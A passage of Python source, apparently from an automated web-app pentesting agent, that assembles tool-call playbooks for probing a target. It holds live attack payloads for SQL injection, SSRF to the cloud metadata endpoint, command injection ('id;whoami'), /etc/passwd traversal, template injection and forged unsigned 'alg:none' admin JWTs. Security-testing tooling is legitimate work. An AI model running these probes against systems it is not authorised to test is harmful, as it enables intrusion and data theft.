            for session_name, creds in credential_sets[:login_attempts]:
                playbook.append({
                    "type": "tool",
                    "tool": "web_interact",
                    "params": {"target": base_url, "path": path, "method": "POST", "payload": creds, "session_name": session_name},
                })

        for path in search_paths[:route_budget]:
            playbook.append({
                "type": "tool",
                "tool": "web_interact",
                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"q": "' UNION SELECT 1,2,3--"}, "browser": browser_enabled},
            })
            if profile["profile"] == "aggressive":
                playbook.append({
                    "type": "tool",
                    "tool": "web_interact",
                    "params": {"target": base_url, "path": path, "method": "GET", "payload": {"q": "\" OR 1=1--"}, "browser": browser_enabled},
                })

        for path in object_paths[:route_budget]:
            playbook.append({
                "type": "tool",
                "tool": "web_interact",
                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"id": "2"}, "browser": browser_enabled},
            })
            if profile["profile"] == "aggressive":
                playbook.append({
                    "type": "tool",
                    "tool": "web_interact",
                    "params": {"target": base_url, "path": path, "method": "GET", "payload": {"id": "999"}, "browser": browser_enabled},
                })

        for path in content_paths[:route_budget]:
            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": browser_enabled}})

        for path in ssrf_paths[:route_budget]:
            playbook.append({
                "type": "tool",
                "tool": "web_interact",
                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"url": "http://127.0.0.1:80"}, "session_name": "user"},
            })
            if profile["profile"] == "aggressive":
                playbook.append({
                    "type": "tool",
                    "tool": "web_interact",
                    "params": {"target": base_url, "path": path, "method": "GET", "payload": {"url": "http://169.254.169.254/latest/meta-data/"}, "session_name": "user"},
                })

        for path in cmd_paths[:route_budget]:
            playbook.append({
                "type": "tool",
                "tool": "web_interact",
                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"cmd": "id;whoami"}, "session_name": "user"},
            })

        for path in download_paths[:route_budget]:
            playbook.append({
                "type": "tool",
                "tool": "web_interact",
                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"file": "../../../../etc/passwd"}, "session_name": "user"},
            })

        for path in token_paths[:route_budget]:
            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "session_name": "user"}})

        for path in admin_paths[:route_budget]:
            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": browser_enabled}})
            playbook.append({
                "type": "tool",
                "tool": "web_interact",
                "params": {"target": base_url, "path": path, "method": "GET", "headers": {"Authorization": f"Bearer {forged_admin}"}},
            })

        for path in upload_paths[:route_budget]:
            playbook.append({
                "type": "tool",
                "tool": "web_interact",
                "params": {
                    "target": base_url,
                    "path": path,
                    "method": "POST",
                    "session_name": "user",
                    "files": {"file": {"filename": "payload.txt", "content": "{{7*7}}", "content_type": "text/plain"}},
                },
            })

        for path in template_paths[:route_budget]:
            playbook.append({
                "type": "tool",
                "tool": "web_interact",
                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"name": "{{7*7}}"}, "session_name": "user"},
            })

        for path in ws_paths[:1]:
            playbook.append({
                "type": "tool",
                "tool": "websocket_interact",
                "params": {"target": ws_target, "path": path, "messages": ["ping", {"action": "ping"}], "headers": {"Origin": base_url}},
            })

        return playbook

    def _candidate_web_paths(self) -> list:
        candidates = ["/"]
        seen = {"/"}
        path_pattern = re.compile(r"(?:href|action|src)\s*=\s*[\"']([^\"'#?]+(?:\?[^\"'#]*)?)[\"']", re.IGNORECASE)
        text_path_pattern = re.compile(r"(?<![A-Za-z0-9_])/(?:[A-Za-z0-9._~!$&'()*+,;=:@%-]+/?)+(?:\?[A-Za-z0-9._~!$&'()*+,;=:@%/?-]+)?")

        def add_path(raw_value: str):
            normalized = self._normalize_candidate_path(raw_value)
            if normalized and normalized not in seen:
                seen.add(normalized)
                candidates.append(normalized)

        for item in self.state.get("history", []):
            params = item.get("params", {}) or {}
            add_path(str(params.get("path") or ""))

            result = item.get("result", {}) or {}
            for field in ("response_preview", "raw", "url", "full_url", "navigation_url"):
                value = result.get(field)
                if not isinstance(value, str) or not value:
                    continue
                for match in path_pattern.findall(value):
                    add_path(match)
                for match in text_path_pattern.findall(value):
                    add_path(match)
            raw_lines = str(result.get("raw") or "").splitlines()
            for line in raw_lines:
                token = line.strip().split()[0] if line.strip() else ""
                if token:
                    add_path(token)

        return candidates

    def _normalize_candidate_path(self, raw_value: str) -> str:
        raw_value = str(raw_value or "").strip()
        if not raw_value:
            return ""
        parsed = urlparse(raw_value)
        if parsed.scheme and parsed.netloc:
            path = parsed.path or "/"
            if parsed.query:
                path = f"{path}?{parsed.query}"
        else:
            path = raw_value
        if path.startswith(("javascript:", "mailto:", "tel:", "#")):
            return ""
        if not path.startswith("/"):
            path = f"/{path.lstrip('./')}"
        if "//" in path and not path.startswith("//"):
            path = re.sub(r"/{2,}", "/", path)
        return path[:256]

    def _best_sqlmap_target(self, base_url: str) -> str:
        routes = self._candidate_web_paths()
        for path in routes:
            lowered = path.lower()
            if any(token in lowered for token in ["/search", "/find", "/query"]):
                separator = "&" if "?" in path else "?"
                return f"{base_url.rstrip('/')}{path}{separator}q=test"
            if "?" in path:
                return f"{base_url.rstrip('/')}{path}"
        return f"{base_url.rstrip('/')}/?id=1"

    def _build_unsigned_jwt(self, payload: Dict[str, Any]) -> str:
        header = {"alg": "none", "typ": "JWT"}
        def encode_part(obj: Dict[str, Any]) -> str:
            raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
            return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
        return f"{encode_part(header)}.{encode_part(payload)}."

    def _should_stop(self):
        return bool(self.should_stop_callback and self.should_stop_callback())

    def _should_pause(self):
        return bool(self.should_pause_callback and self.should_pause_callback())

    def _apply_tool_constraints(self, tool_name: str, params: Dict[str, Any]) -> Dict[str, Any]:
        constrained = dict(params)
        policy = self.policy.policy
        max_timeout = int(policy.get("max_tool_timeout_seconds", 300))
        tool_timeouts = policy.get("tool_timeouts", {})
        default_timeout = int(tool_timeouts.get(tool_name, max_timeout))
        tooling_settings = self.settings.get("tooling", {}) if isinstance(self.settings, dict) else {}
        profile = self._web_profile_settings() if self.mode == "webapp" else {"profile": "balanced"}
        timeout_override = tooling_settings.get("timeout")
        if timeout_override:
            default_timeout = int(timeout_override)
        if tool_name == "ffuf" and tooling_settings.get("ffuf_threads"):
            constrained.setdefault("threads", int(tooling_settings["ffuf_threads"]))
        if tool_name == "gobuster" and tooling_settings.get("gobuster_threads"):
            constrained.setdefault("threads", int(tooling_settings["gobuster_threads"]))
        if tool_name in {"ffuf", "gobuster"} and "threads" not in constrained:
            if profile["profile"] == "aggressive":
                constrained["threads"] = 60 if tool_name == "ffuf" else 20
            elif profile["profile"] == "cautious":
                constrained["threads"] = 15 if tool_name == "ffuf" else 5
        requested_timeout = int(constrained.get("timeout", default_timeout))
        constrained["timeout"] = max(1, min(requested_timeout, max_timeout))
        return constrained
